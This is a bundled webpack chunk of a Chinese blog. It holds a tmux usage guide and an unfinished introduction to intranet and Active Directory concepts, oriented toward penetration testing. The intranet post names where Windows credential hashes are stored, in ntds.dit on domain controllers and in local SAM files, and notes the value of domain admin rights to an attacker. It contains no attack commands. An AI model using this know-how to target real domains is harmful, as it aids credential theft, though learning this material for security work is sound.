"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[8130],{77735:n=>{n.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"tmux","metadata":{"permalink":"/blog/tmux","editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/blog/2024-11-11-tmux/tmux\u7b80\u5355\u914d\u7f6e.md","source":"@site/blog/2024-11-11-tmux/tmux\u7b80\u5355\u914d\u7f6e.md","title":"tmux\u7b80\u5355\u4f7f\u7528","description":"\u914d\u7f6e\u6587\u4ef6","date":"2024-11-11T00:00:00.000Z","tags":[],"readingTime":1.15,"hasTruncateMarker":false,"authors":[{"name":"C0rr3ct","title":"Right?","url":"https://github.com/","imageURL":"https://avatars.githubusercontent.com/u/213068687","key":"C0rr3ct","page":null}],"frontMatter":{"slug":"tmux","title":"tmux\u7b80\u5355\u4f7f\u7528","authors":"C0rr3ct"},"unlisted":false,"nextItem":{"title":"\u5185\u7f51\u57fa\u7840\u77e5\u8bc6","permalink":"/blog/2024/11/11/tmux/\u5185\u7f51\u5b66\u4e60"}},"content":"## \u914d\u7f6e\u6587\u4ef6\\r\\n\\r\\n\u5728\u5bb6\u76ee\u5f55\u521b\u952e`.tmux.conf`\\r\\n\\r\\n```\\r\\nset-option -g default-shell /bin/zsh\\r\\n\\r\\n# \u4f7f\u7528Ctrl+x\u4f5c\u4e3a\u524d\u7f00\u7ec4\u5408\u952e\\r\\nset -g prefix C-x\\r\\nunbind C-b\\r\\nbind C-x send-prefix\\r\\n\\r\\n# \u652f\u6301\u9f20\u6807\u64cd\u4f5c\\r\\nsetw -g mouse on\\r\\nset-option -g status-right \\"\\"\\r\\n```\\r\\n\\r\\n## \u4f1a\u8bdd(session)\u7ba1\u7406\\r\\n\\r\\n### \u67e5\u770b\u4f1a\u8bdd\\r\\n\\r\\n```\\r\\ntmux ls\\r\\n```\\r\\n\\r\\n### \u8fde\u63a5\u5230\u6700\u8fd1\u7684\u4f1a\u8bdd\\r\\n\\r\\n```\\r\\ntmux attach\\r\\ntmux a\\r\\n```\\r\\n\\r\\n### \u6740\u6b7b\u6240\u6709\u4f1a\u8bdd\\r\\n\\r\\n```\\r\\ntmux kill-server\\r\\n```\\r\\n\\r\\n### \u6740\u6b7b\u67d0\u4e2a\u4f1a\u8bdd\\r\\n\\r\\n```\\r\\ntmux kill-session -t <session-name>\\r\\n```\\r\\n\\r\\n### \u5207\u6362\u4f1a\u8bdd\\r\\n\\r\\n| **\u5feb\u6377\u952e** |         \u547d\u4ee4          |     \u8bf4\u660e     |\\r\\n| :--------: | :-------------------: | :----------: |\\r\\n|  \u524d\u7f00 + s  | `tmux choose-session` | \u67e5\u770b\u4f1a\u8bdd\u5217\u8868 |\\r\\n\\r\\n## \u7a97\u683c(pane)\u7ba1\u7406\\r\\n\\r\\n| **\u5feb\u6377\u952e** |            \u547d\u4ee4            |             \u8bf4\u660e             |\\r\\n| :--------: | :------------------------: | :--------------------------: |\\r\\n|  \u524d\u7f00 + %  |   `tmux split-window -h`   |           \u6c34\u5e73\u5206\u5272           |\\r\\n| \u524d\u7f00 + \\"\\"  |   `tmux split-window -v`   |           \u5782\u76f4\u5206\u5272           |\\r\\n|  \u524d\u7f00 + x  | `tmux kill-pane` \u6216 `exit` |         \u5173\u95ed\u5f53\u524d\u7a97\u683c         |\\r\\n|  \u524d\u7f00 + z  |   `tmux resize-pane -Z`    | \u5c06\u5f53\u524d\u7a97\u683c\u5168\u5c4f\uff0c\u518d\u6b21\u6309\u4e0b\u6062\u590d |\\r\\n\\r\\n## \u7a97\u53e3(window)\u7ba1\u7406\\r\\n\\r\\n| **\u5feb\u6377\u952e** |         \u547d\u4ee4         |                \u8bf4\u660e                |\\r\\n| :--------: | :------------------: | :--------------------------------: |\\r\\n|  \u524d\u7f00 + w  | `tmux choose-window` | \u5f39\u51fa\u7a97\u53e3\u5217\u8868\uff0c\u53ef\u4ee5\u9009\u62e9\u8981\u5207\u6362\u7684\u7a97\u53e3 |"},{"id":"/2024/11/11/tmux/\u5185\u7f51\u5b66\u4e60","metadata":{"permalink":"/blog/2024/11/11/tmux/\u5185\u7f51\u5b66\u4e60","editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/blog/2024-11-11-tmux/\u5185\u7f51\u5b66\u4e60.md","source":"@site/blog/2024-11-11-tmux/\u5185\u7f51\u5b66\u4e60.md","title":"\u5185\u7f51\u57fa\u7840\u77e5\u8bc6","description":"\u5de5\u4f5c\u7ec4","date":"2024-11-11T00:00:00.000Z","tags":[],"readingTime":41.31,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"tmux\u7b80\u5355\u4f7f\u7528","permalink":"/blog/tmux"},"nextItem":{"title":"\u5e38\u7528\u547d\u4ee4","permalink":"/blog/Command"}},"content":"## \u5de5\u4f5c\u7ec4\\r\\n\\r\\n\u200b\\t\u5185\u7f51\u4e5f\u6307\u5c40\u57df\u7f51\uff0c\u662f\u6307\u5728\u67d0\u4e00\u533a\u57df\u5185\u7531\u591a\u53f0\u8ba1\u7b97\u673a\u4e92\u8fde\u800c\u6210\u7684\u8ba1\u7b97\u673a\u7ec4,\u7ec4\u7f51\u8303\u56f4\u901a\u5e38\u5728\u6570\u5343\u7c73\u4ee5\u5185\u3002\u5728\u5c40\u57df\u7f51\u4e2d,\u53ef\u4ee5\u5b9e\u73b0\u6587\u4ef6\u7ba1\u7406\u3001\u5e94\u7528\u8f6f\u4ef6\u5171\u4eab\u3001\u6253\u5370\u673a\u5171\u4eab\u3001\u5de5\u4f5c\u7ec4\u5185\u7684\u65e5\u7a0b\u5b89\u6392\u3001\u7535\u5b50\u90ae\u4ef6\u548c\u4f20\u771f\u901a\u4fe1\u670d\u52a1\u7b49\u3002\u5185\u7f51\u662f\u5c01\u95ed\u7684,\u53ef\u4ee5\u7531\u529e\u516c\u5ba4\u5185\u7684\u4e24\u53f0\u8ba1\u7b97\u673a\u7ec4\u6210,\u4e5f\u53ef\u4ee5\u7531\u4e00\u4e2a\u516c\u53f8\u5185\u7684\u5927\u91cf\u8ba1\u7b97\u673a\u7ec4\u6210\u3002\\r\\n\\r\\n\u200b\\t\u5728\u4e00\u4e2a\u5927\u578b\u5355\u4f4d\u91cc,\u53ef\u80fd\u6709\u6210\u767e\u4e0a\u5343\u53f0\u8ba1\u7b97\u673a\u4e92\u76f8\u8fde\u63a5\u7ec4\u6210\u5c40\u57df\u7f51,\u5b83\u4eec\u90fd\u4f1a\u5217\u5728\\"\u7f51\u7edc\\"(\u7f51\u4e0a\u90bb\u5c45)\u5185\u3002\u5982\u679c\u4e0d\u5bf9\u8fd9\u4e9b\u8ba1\u7b97\u673a\u8fdb\u884c\u5206\u7ec4,\u7f51\u7edc\u7684\u6df7\u4e71\u7a0b\u5ea6\u662f\u53ef\u60f3\u800c\u77e5\u7684 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898,\u4ea7\u751f\u4e86**\u5de5\u4f5c\u7ec4( Work Group)**\u8fd9\u4e2a\u6982\u5ff5\u3002\\r\\n\\r\\n\u200b\\t\u5c06\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u6309\u529f\u80fd(\u6216\u90e8\u95e8)\u5206\u522b\u5217\u5165\u4e0d\u540c\u7684\u5de5\u4f5c\u7ec4,\u4f8b\u5982\u6280\u672f\u90e8\u7684\u8ba1\u7b97\u673a\u90fd\u5217\u5165\\"\u6280\u672f\u90e8\\"\u5de5\u4f5c\u7ec4\u3001\u884c\u653f\u90e8\u7684\u8ba1\u7b97\u673a\u90fd \u5217\u5165\\"\u884c\u653f\u90e8\\"\u5de5\u4f5c\u7ec4\u3002\u8981\u60f3\u8bbf\u95ee\u67d0\u4e2a\u90e8\u95e8\u7684\u8d44\u6e90,\u53ea\u8981\u5728\\"\u7f51\u7edc\\"\u91cc\u53cc\u51fb\u8be5\u90e8\u95e8\u7684\u5de5\u4f5c\u7ec4\u540d \u5c31\u53ef\u4ee5\u770b\u5230\u8be5\u90e8\u95e8\u7684\u6240\u6709\u8ba1\u7b97\u673a\u4e86\u3002 \u76f8\u6bd4\u4e0d\u5206\u7ec4\u7684\u60c5\u51b5,\u8fd9\u6837\u7684\u60c5\u51b5\u6709\u5e8f\u5f97\u591a(\u5c24\u5176\u5bf9\u5927\u578b\u5c40\u57df \u7f51\u6765\u8bf4)\u3002\\r\\n\\r\\n### \u52a0\u5165\u5de5\u4f5c\u7ec4\\r\\n\\r\\n\u53f3\u952e\u6211\u7684\u7535\u8111\uff0c\u67e5\u770b\u5c5e\u6027\uff0c\u4fee\u6539\u5de5\u4f5c\u7ec4\u540d\u79f0\u5373\u53ef\\r\\n\\r\\n![image-20250403215753054](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403215753054.png)\\r\\n\\r\\n### \u9000\u51fa\u5de5\u4f5c\u7ec4\\r\\n\\r\\n\u53ea\u8981\u5c06\u5de5\u4f5c\u7ec4\u540d\u79f0\u6539\u52a8\u5373\u53ef\u3002\u4e0d\u8fc7\u5728\u7f51\u4e0a\u522b\u4eba\u7167\u6837\u53ef\u4ee5**\u8bbf\u95ee\u4f60\u7684\u5171\u4eab\u8d44\u6e90**\u3002\u4f60\u4e5f\u53ef\u4ee5\u968f\u4fbf\u52a0\u5165\u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u4efb\u4f55\u5176\u5b83\u5de5\u4f5c\u7ec4\u3002\\r\\n\\r\\n**\u5de5\u4f5c\u7ec4**\u5c31\u50cf\u4e00\u4e2a\u53ef\u4ee5\u81ea\u7531\u8fdb\u5165\u548c \u9000\u51fa\u7684**\u793e\u56e2**\uff0c\u65b9\u4fbf\u540c\u4e00\u7ec4\u7684\u8ba1\u7b97\u673a\u4e92\u76f8\u8bbf\u95ee\u3002\\r\\n\\r\\n### \u5de5\u4f5c\u7ec4\u7684\u4f18\u7f3a\u70b9\\r\\n\\r\\n\u4f18\u70b9\uff1a \\r\\n\\r\\n- 1\u3001\u65b9\u4fbf\u7ba1\u7406\u548c\u7ef4\u62a4 \\r\\n- 2\u3001**\u8d44\u6e90\u5206\u914d\u65b9\u4fbf\u548c\u7075\u6d3b** \\r\\n\\r\\n\u7f3a\u70b9\uff1a \\r\\n\\r\\n- 1\u3001**\u7f3a\u4e4f\u96c6\u4e2d\u7ba1\u7406\u4e0e\u63a7\u5236\u7684\u673a\u5236** \\r\\n- 2\u3001**\u6ca1\u6709\u96c6\u4e2d\u7684\u7edf\u4e00\u5e10\u6237\u7ba1\u7406** \\r\\n- 3\u3001\u53ea\u9002\u5408\u5c0f\u89c4\u6a21\u7528\u6237\u7684\u4f7f\u7528\\r\\n\\r\\n## \u57df\u73af\u5883\\r\\n\\r\\n\u200b\\t\u57df ( Domain)\u662f\u4e00\u4e2a\u6709\u5b89\u5168\u8fb9\u754c\u7684\u8ba1\u7b97\u673a\u96c6\u5408(\u5b89\u5168\u8fb9\u754c\u7684\u610f\u601d\u662f,\u5728\u4e24\u4e2a\u57df\u4e2d,\u4e00\u4e2a\u57df\u4e2d\u7684\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee\u53e6\u4e00\u4e2a\u57df\u4e2d\u7684\u8d44\u6e90)\u53ef\u4ee5\u7b80\u5355\u5730\u628a\u57df\u7406\u89e3\u6210\u5347\u7ea7\u7248\u7684\u5de5\u4f5c\u7ec4\u3002\\r\\n\\r\\n\u200b\\t\u4e0e\u5de5\u4f5c\u7ec4\u76f8\u6bd4, \u57df\u7684\u5b89\u5168\u7ba1\u7406\u63a7\u5236\u673a\u5236\u66f4\u52a0\u4e25\u683c\u3002\u7528\u6237\u8981\u60f3\u8bbf\u95ee\u57df\u5185\u7684\u8d44\u6e90,\u5fc5\u987b\u4ee5**\u5408\u6cd5\u7684\u8eab\u4efd\u767b\u5f55\u57df**,\u800c\u7528\u6237\u5bf9\u57df\u5185\u7684\u8d44\u6e90\u62e5\u6709\u4ec0\u4e48\u6837\u7684\u6743\u9650,\u8fd8\u53d6\u51b3\u4e8e\u7528\u6237\u5728\u57df\u5185\u7684\u8eab\u4efd\u3002\\r\\n\\r\\n\u200b\\t\u5728\u57df\u73af\u5883\u4e2d\uff0c**\u57df\u7ba1\u7406\u5458**\u662f\u6743\u9650\u6700\u5927\u7684\u7528\u6237\uff0c\u5728\u6574\u4e2a\u57df\u4e2d\u5177\u6709\u6700\u9ad8\u8bbf\u95ee\u6743\u9650\u548c\u6700\u9ad8\u7ba1\u7406\u6743\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u63a7\u5236\u5668\u96c6\u4e2d\u8fc7\u6ee4\u7ec4\u7ec7\u4e2d\u6210\u5343\u4e0a\u4e07\u53f0\u8ba1\u7b97\u673a\u7f51\u7edc\u8d44\u6e90\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u80fd\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u5f80\u5f80\u53ef\u4ee5\u63a7\u5236\u6574\u4e2a\u57df\u63a7\u3002\\r\\n\\r\\n### \u5355\u57df\\r\\n\\r\\n\u200b\\t\u5355\u57df\u662f\u6307\u7f51\u7edc\u73af\u5883\u4e2d\u53ea\u6709\u4e00\u4e2a\u57df\uff0c\u5728\u4e00\u4e2a\u8ba1\u7b97\u673a\u6570\u91cf\u8f83\u5c11\uff0c\u5730\u7406\u4f4d\u7f6e\u56fa\u5b9a\u7684\u5c0f\u89c4\u6a21\u7684\u7ec4\u7ec7\u4e2d\uff0c\u5efa\u7acb\u4e00\u4e2a\u5355\u72ec\u7684\u57df\\r\\n\\r\\n\u200b\\t\u4f8b\u5982\uff1a\u57df\u63a7\u5236\u5668\u2014>PC1 ,PC2 \uff0cweb\u670d\u52a1\\r\\n\\r\\n### \u7236\u57df\u548c\u5b50\u57df\\r\\n\\r\\n\u200b\\t\u6ee1\u8db3\u7ba1\u7406\u9700\u6c42\uff0c\u9700\u8981\u5728\u4e00\u4e2a\u57df\u4e2d\u56fd\u5212\u5206\u51fa\u591a\u4e2a\u5b50\u57df\u3002\u88ab\u5212\u5206\u7684\u57df\u4e3a\u7236\u57df\uff0c\u5212\u5206\u51fa\u6765\u7684\u5404\u90e8\u5206\u57df\u4e3a\u5b50\u57df\u3002\\r\\n\\r\\n\u200b\\t\u4f8b\u5982\uff1a\u5728\u4e00\u4e2a\u5927\u578b\u7ec4\u7ec7\u7684\u5404\u90e8\u95e8\u4f4d\u4e8e\u4e0d\u540c\u7684\u5730\u7406\u4f4d\u7f6e\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u53ef\u4ee5\u628a\u4e0d\u540c\u4f4d\u7f6e\u7684\u90e8\u95e8\u5206\u522b\u653e\u5728\u4e0d\u540c\u7684\u5b50\u57df\uff0c\u6bcf\u4e2a\u5b50\u57df\u90fd\u80fd\u62e5\u6709\u81ea\u5df1\u7684\u5b89\u5168\u7b56\u7565\u3002\\r\\n\\r\\n\u200b\\t\u4ece\u57df\u540d\u770b\uff0c\u5b50\u57df\u662f\u6574\u4e2a\u57df\u540d\u4e2d\u7684\u4e00\u6bb5\u3002\u5404\u5b50\u57df\u4e4b\u5bb6\u4f7f\u7528\u201c . \\" \u6765\u5206\u5272\uff0c\u4e00\u4e2a\u201d . \u201c\u5c31\u4ee3\u8868\u57df\u540d\u7684\u4e00\u4e2a\u5c42\u7ea7\u3002\\r\\n\\r\\n\u200b\\t\u4f8b\u5982\uff1a`hack-my.com` \u662f\u7236\u57df\uff0c `asia.hack-my.com`\uff0c`na.hack-my.com` \u8fd9\u4e24\u4e2a\u4e3a\u5b50\u57df\u3002\\r\\n\\r\\n### \u57df\u6811\\r\\n\\r\\n\u200b\\t\u57df\u6811\u662f\u591a\u4e2a\u57df\u901a\u8fc7**\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u7ec4\u6210\u7684\u4e00\u4e2a\u96c6\u5408**\u3002\u5728\u57df\u6811\u4e2d\uff0c\u6240\u6709\u7684\u57df\u5171\u4eab\u540c\u4e00\u4e2a\u8868\u7ed3\u6784\u548c\u914d\u7f6e\uff0c\u6240\u6709\u7684\u57df\u540d\u5f62\u6210\u4e00\u4e2a\u8fde\u7eed\u7684\u540d\u5b57\u7a7a\u95f4\uff0c\u57df\u540d\u5c42\u6b21\u8d8a\u6df1\uff0c\u4ee3\u8868\u7ea7\u522b\u8d8a\u4f4e\u3002\\r\\n\\r\\n\u200b\\t\u5728\u57df\u6811\u4e2d\uff0c\u57df\u7ba1\u7406\u5458\u53ea\u80fd\u7ba1\u7406\u672c\u57df\uff0c\u4e0d\u80fd\u8bbf\u95ee\u6216\u8005\u7ba1\u7406\u5176\u4ed6\u57df\uff0c\u5982\u679c**\u4e24\u4e2a\u57df\u4e4b\u95f4\u9700\u8981\u4e92\u76f8\u8bbf\u95ee**\uff0c\u9700\u8981**\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb**\u3002\\r\\n\\r\\n### \u57df\u6797\\r\\n\\r\\n\u200b\\t\u57df\u6797\u662f\u6307\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u6ca1\u6709\u5f62**\u6210\u8fde\u7eed\u540d\u5b57\u7a7a\u95f4\u7684\u57df\u6811\u7ec4\u6210\u57df\u6811\u96c6\u5408**\uff0c\u57df\u6797\u548c\u57df\u6811\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\uff0c\u57df\u6797\u4e2d\u7684\u57df\u548c\u57df\u6811\u4e4b\u95f4\u6ca1\u6709\u5f62\u6210\u8fde\u7eed\u7684\u540d\u5b57\u7a7a\u95f4\uff0c\u4f46\u57df\u6797\u4e2d\u6240\u6709\u7684\u57df\u6811\u5171\u4eab\u4e00\u4e2a\u8868\u7ed3\u6784\uff0c\u914d\u7f6e\u548c\u5168\u5c40\u76ee\u5f55\u3002\\r\\n\\r\\n### \u57df\u63a7\u5236\u5668\\r\\n\\r\\n\u200b\\t**\u57df\u63a7\u5236\u5668**\uff08Domain Controller\uff0c\u7b80\u5199\u4e3aDC\uff09\u662f\u57df\u73af\u5883\u4e2d\u6838\u5fc3\u7684\u670d\u52a1\u5668\u8ba1\u7b97\u673a\uff0c\u7528\u4e8e\u5728\u57df\u4e2d\u54cd\u5e94\u5b89\u5168\u8eab\u4efd\u9a8c\u8bc1\u8bf7\u6c42\uff0c\u8d1f\u8d23\u5141\u8bb8\u6216\u62d2\u7edd\u53d1\u51fa\u8bf7\u6c42\u7684\u4e3b\u673a\u8bbf\u95ee\u57df\u5185\u8d44\u6e90\uff0c\u4ee5\u53ca\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5b58\u50a8\u7528\u6237\u8d26\u6237\u4fe1\u606f\u5e76\u6267\u884c\u57df\u7684\u5b89\u5168\u7b56\u7565\u7b49\u3002\\r\\n\\r\\n\u200b\\t\u57df\u63a7\u5236\u5668\u5305\u542b\u4e00\u4e2a**\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93**\uff0c\u5176\u4e2d\u5b58\u50a8\u7740\u6574\u4e2a\u57df\u7684\u7528\u6237\uff0c\u5bc6\u7801\uff0c\u8ba1\u7b97\u673a\u7b49\u4fe1\u606f\u3002\\r\\n\\r\\n\u200b\\t\u4e00\u4e2a\u57df\u73af\u5883\u4e2d\u53ef\u4ee5\u62e5\u6709**\u4e00\u53f0\u6216\u8005\u591a\u53f0\u57df\u63a7\u5236\u5668**\uff0c\u6bcf\u53f0\u63a7\u5236\u5668\u5404\u81ea\u5b58\u50a8\u4e00\u4efd\u6240\u5728\u57df\u7684**\u6d3b\u52a8\u76ee\u5f55\u7684\u53ef\u5199\u526f\u672c**\uff0c\u5bf9\u6d3b\u52a8\u76ee\u5f55\u7684\u5982\u4f55\u4fee\u6539\u90fd\u53ef\u4ee5\u4ece\u6e90\u57df\u63a7\u5236\u5668\u540c\u6b65\u590d\u5236\u5230\u57df\uff0c\u57df\u6811\u6216\u8005\u57df\u6797\u7684\u5176\u4ed6\u63a7\u5236\u5668\u4e0a\u3002\u76f8\u5f53\u4e8e\u6570\u636e\u5907\u4efd\uff0c\u5373\u4f7f\u5176\u4e2d\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u762b\u75ea\u4e86\uff0c\u53e6\u5916\u4e00\u53f0\u63a7\u5236\u5668\u53ef\u4ee5\u7ee7\u7eed\u5de5\u4f5c\uff0c\u4fdd\u8bc1\u57df\u73af\u5883\u7684\u6b63\u5e38\u8fd0\u884c\u3002\\r\\n\\r\\n## \u57df\u73af\u5883\u642d\u5efa\\r\\n\\r\\n| \u673a\u5668\u540d\u79f0                        | \u673a\u5668IP        |\\r\\n| ------------------------------- | ------------- |\\r\\n| Windows Server 2012\uff08\u57df\u63a7\uff09     | 192.168.28.37 |\\r\\n| Windows Server 2008\uff08\u57df\u5185\u4e3b\u673a\uff09 | 192.168.28.3  |\\r\\n| Windows Server 2003\uff08\u57df\u5185\u4e3b\u673a\uff09 | 192.168.28.35 |\\r\\n\\r\\n### **\u57df\u63a7\u5236\u5668\u521b\u5efa**\\r\\n\\r\\n\u5b89\u88c5AD\u57df\u4e4b\u524d\uff0c\u9700\u8981\u4fee\u6539\u673a\u5668IP\u4e3a\u9759\u6001IP\uff0c\u8ba1\u7b97\u673a\u540d\u547d\u540d\u4e3a\uff1aDC\\r\\n\\r\\n![image-20250403222639136](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403222639136.png)\\r\\n\\r\\n\u8fd9\u91ccDNS\u670d\u52a1\u5668\u5e94\u8be5\u662f\uff1a`192.168.28.37`\uff0c\u5b89\u88c5\u5b8c\u57df\u4ee5\u540e\uff0c\u5c31\u53d8\u6210\u4e86`127.0.0.1`\\r\\n\\r\\n\u8ba1\u7b97\u673a\u540d\u547d\u540d\u4e3a\uff1aDC\\r\\n\\r\\n![image-20250403222826661](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403222826661.png)\\r\\n\\r\\n\u6253\u5f00\u670d\u52a1\u5668\u7ba1\u7406\u5668\uff0c\u6dfb\u52a0\u89d2\u8272\u548c\u529f\u80fd\uff0c\u5b89\u88c5\u4e0b\u9762\u4e24\u4e2a\u670d\u52a1\uff08Active Directory\u548cDNS\u670d\u52a1\u5668\uff09\uff0c\u63a5\u7740\u4e00\u76f4\u4e0b\u4e00\u6b65\\r\\n\\r\\n![image-20250403222954494](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403222954494.png)\\r\\n\\r\\n\u5b89\u88c5\u5b8c\uff0c\u70b9\u51fb\u5347\u7ea7\u4e3a\u57df\u63a7\u5236\u5668\\r\\n\\r\\n\u9009\u62e9**\u6dfb\u52a0\u65b0\u6797**\uff0c\u8f93\u5165\u4f60\u60f3\u8981\u7684\u6839\u57df\u540d\uff0c\u4f8b\u5982\uff1aabc.com\\r\\n\\r\\n\u7136\u540e\uff0c\u8bbe\u7f6e\u76ee\u5f55\u670d\u52a1\u8fd8\u539f\u6a21\u5f0f\u7684\u5bc6\u7801(\u5728\u5f00\u673a \u8fdb\u5165\u5b89\u5168\u6a21\u5f0f\u4fee\u590d\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u65f6\u5c06\u4f7f\u7528\u6b64\u5bc6\u7801)\\r\\n\\r\\n\u5b89\u88c5\u5b8c\u6210\u4ee5\u540e\\r\\n\\r\\n![image-20250403223451864](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403223451864.png)\\r\\n\\r\\nping \u57df\u540d\uff0c\u89e3\u6790\u7684\u662f\u57df\u63a7\u5236\u5668\u7684ip\uff0c\u5373\u642d\u5efa\u6210\u529f\\r\\n\\r\\n![image-20250403223533530](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403223533530.png)\\r\\n\\r\\n### \u57df\u5185\u4e3b\u673a\u642d\u5efa\\r\\n\\r\\n\u8bbe\u7f6eDNS\u670d\u52a1\u5668\u4e3a\u57df\u63a7\u5236\u5668\u7684IP\\r\\n\\r\\n![image-20250403223738893](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403223738893.png)\\r\\n\\r\\n\u4e4b\u540e\u8f93\u5165\u4f60\u8fdb\u5165\u7684\u57df\u540d\uff0c\u8f93\u5165\u57df\u5185\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u5373\u53ef\u6210\u529f\u52a0\u5165\u57df\u5185\\r\\n\\r\\n![image-20250403223910966](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403223910966.png)\\r\\n\\r\\n## AD\u6d3b\u52a8\u76ee\u5f55\\r\\n\\r\\n\u200b\\t\u6d3b\u52a8\u76ee\u5f55( Active Directory,AD)\u662f\u6307\u57df\u73af\u5883\u4e2d\u63d0\u4f9b\u76ee\u5f55\u670d\u52a1\u7684\u7ec4\u4ef6\uff0c\u76ee\u5f55\u7528\u4e8e\u5b58\u50a8\u6709\u5173\u7f51\u7edc\u5bf9\u8c61(\u4f8b\u5982\u7528\u6237\u3001\u7ec4\u3001\u8ba1\u7b97\u673a\u3001\u5171\u4eab\u8d44\u6e90\u3001\u6253\u5370\u673a\u548c\u8054\u7cfb\u4eba\u7b49)\u7684\u4fe1\u606f\u3002\\r\\n\\r\\n### **Ntds.dit** \u6587\u4ef6\\r\\n\\r\\n\u200b\\t**Ntds.dit \u6587\u4ef6**\u662f\u57df\u73af\u5883\u7684\u57df\u63a7\u5236\u5668\u4e0a\u4fdd\u5b58\u7684\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u662f\u4e3b\u8981\u7684\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\uff0c\u5176\u6587\u4ef6\u8def\u5f84\u4e3a\u57df\u63a7\u5236\u5668\u7684%SystemRoot%\\\\ntds\\\\ntds.dis \u3002ntds\u6587\u4ef6\u4e2d\u5305\u542b\u4f46\u4e0d\u9650\u4e8e\u6709\u5173\u57df\u7528\u6237\uff0c\u7528\u6237\u5bc6\u7801\u7684\u54c8\u5e0c\uff0c\u7528\u6237\u7ec4\uff0c\u7ec4\u6210\u5458\u8eab\u4efd\u548c\u7ec4\u7b56\u7565\u7684\u4fe1\u606f\u3002\\r\\n\\r\\n\u200b\\t\u5728\u975e\u57df\u73af\u5883\u4e2d\u5373\u5de5\u4f5c\u7ec4\u73af\u5883\u4e2d\uff0c\u7528\u6237\u7684\u767b\u5f55\u51ed\u8bc1\u7b49\u4fe1\u606f\u5b58\u50a8\u5728\u672c\u5730\u7684SAM\u6587\u4ef6\u4e2d\uff0cSAM\u6587\u4ef6\u7684\u4f4d\u7f6e\u4f4d\u4e8e\uff1a`C:\\\\Windows/system32/config/`\\r\\n\\r\\n### \u76ee\u5f55\u670d\u52a1\u4e0eLDAP\\r\\n\\r\\n\u200b\\t\u6d3b\u52a8\u76ee\u5f55\u662f\u4e00\u79cd\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\uff0c\u533a\u522b\u4e8e\u5e38\u89c1\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\u3002\u76ee\u5f55\u6570\u636e\u5e93\u5b9e\u73b0\u662f\u76ee\u5f55\u670d\u52a1\uff0c\u662f\u4e00\u4e2a\u5e2e\u52a9\u7528\u6237\u5feb\u901f\uff0c\u51c6\u786e\u5730\u4ece\u76ee\u5f55\u4e2d\u627e\u5230\u6240\u9700\u8981\u4fe1\u606f\u7684\u670d\u52a1\u3002\u76ee\u5f55\u6570\u636e\u5e93\u5c06\u6240\u6709\u6570\u636e\u5e93\u7ec4\u7ec7\u6210\u4e00\u4e2a\u6709\u5c42\u6b21\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u5176\u4e2d\u7684\u6bcf\u4e00\u4e2a\u8282\u70b9\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u6237\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u5bf9\u8c61\u540d\u79f0\u53bb\u67e5\u627e\u8fd9\u4e2a\u5bf9\u8c61\u7684\u6709\u5173\u4fe1\u606f\u3002\\r\\n\\r\\n\u200b\\tLDAP (**\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae** Lightweight Directory Access Protocol) \u7528\u6765**\u8bbf\u95ee\u670d\u52a1\u6570\u636e\u5e93\u7684\u4e00\u4e2a\u534f\u8bae**\uff0c\u6d3b\u52a8\u76ee\u5f55\u5c31\u662f\u5229\u7528LDAP \u540d\u79f0\u8def\u5f84\u6765\u63cf\u8ff0\u5bf9\u8c61\\r\\n\\r\\n\u200b\\t\u5728\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u7684\uff0c **LDAP \u9ed8\u8ba4\u7aef\u53e3389** \u3002\\r\\n\\r\\n> \u76ee\u5f55\u6811\uff1a\u5728\u4e00\u4e2a\u76ee\u5f55\u6570\u636e\u5e93\u4e2d\uff0c\u6574\u4e2a\u76ee\u5f55\u4e2d\u7684\u4fe1\u606f\u96c6\u53ef\u4ee5\u8868\u793a\u4e3a\u4e00\u4e2a\u76ee\u5f55\u6811\uff0c\u6811\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u662f\u4e00\u4e2a\u6761\u76ee\u3002\\r\\n>\\r\\n> 